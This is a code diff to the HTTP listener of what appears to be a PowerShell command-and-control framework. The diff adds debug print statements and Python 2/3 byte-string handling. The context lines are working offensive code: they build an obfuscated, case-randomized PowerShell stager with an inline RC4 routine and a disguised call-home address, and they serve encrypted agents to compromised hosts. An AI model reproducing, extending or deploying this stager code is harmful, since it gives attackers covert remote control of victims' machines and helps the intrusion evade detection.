@@ -336,7 +336,7 @@ class Listener(object):
                     stager += helpers.randomize_capitalization(
                         "$" + helpers.generate_random_script_var_name("wc") + '.Headers.Add(')
                     stager += "'User-Agent',$u);"
-                    
+                    print("http.py: line 339")
                     if proxy.lower() != 'none':
                         if proxy.lower() == 'default':
                             stager += helpers.randomize_capitalization("$" + helpers.generate_random_script_var_name(
@@ -367,7 +367,7 @@ class Listener(object):
                                 stager += helpers.randomize_capitalization(
                                     "$" + helpers.generate_random_script_var_name(
                                         "wc") + ".Proxy.Credentials = $netcred;")
-                        
+                        print("http.py: line 370")
                         # save the proxy settings to use during the entire staging process and the agent
                         stager += "$Script:Proxy = $" + helpers.generate_random_script_var_name("wc") + ".Proxy;"
                 
@@ -386,18 +386,16 @@ class Listener(object):
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                 stager += "'%s');" % (stagingKey)
-                
                 # this is the minimized RC4 stager code from rc4.ps1
                 stager += helpers.randomize_capitalization(
                     '$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
-                
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL',
                                                              meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
-                
+                print("http.py: 399")
                 stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
-                
+                print("http.py: line 400")
                 # Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
@@ -413,7 +411,7 @@ class Listener(object):
                         stager += helpers.randomize_capitalization(
                             "$" + helpers.generate_random_script_var_name("wc") + ".Headers.Add(")
                         stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
-                
+                print("http.py: line 416")
                 # add the RC4 packet to a cookie
                 stager += helpers.randomize_capitalization(
                     "$" + helpers.generate_random_script_var_name("wc") + ".Headers.Add(")
@@ -600,7 +598,12 @@ class Listener(object):
             stager = stager.replace('index.jsp', stage1)
             stager = stager.replace('index.php', stage2)
             
+            
             randomizedStager = ''
+            # forces inputs into a bytestring to ensure 2/3 compatibility
+            stagingKey = bytes(stagingKey)
+            stager = stager.encode('latin-1')
+            randomizedStager = randomizedStager.encode('latin-1')
             
             for line in stager.split("\n"):
                 line = line.strip()
@@ -620,6 +623,9 @@ class Listener(object):
                 return helpers.enc_powershell(randomizedStager)
             elif encrypt:
                 RC4IV = os.urandom(4)
+                print('RC4IV: ' + str(type(RC4IV)))
+                print('stagingKey: ' + str(type(stagingKey)))
+                print('randomizedStager: ' + str(type(randomizedStager)))
                 return RC4IV + encryption.rc4(RC4IV + stagingKey, randomizedStager)
             else:
                 # otherwise just return the case-randomized stager
@@ -1128,6 +1134,7 @@ def send_message(packets=None):
             
             # the routing packet should be at the front of the binary request.data
             #   NOTE: this can also go into a cookie/etc.
+            print('http.py(handle_post): 1138')
             dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, requestData, listenerOptions, clientIP)
             if dataResults and len(dataResults) > 0:
                 for (language, results) in dataResults:
@@ -1159,6 +1166,7 @@ def send_message(packets=None):
                             agentCode = self.generate_agent(language=language, listenerOptions=tempListenerOptions,
                                                             obfuscate=self.mainMenu.obfuscate,
                                                             obfuscationCommand=self.mainMenu.obfuscateCommand)
+                            print('http.py: 1169')
                             encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                             # TODO: wrap ^ in a routing packet?
                             
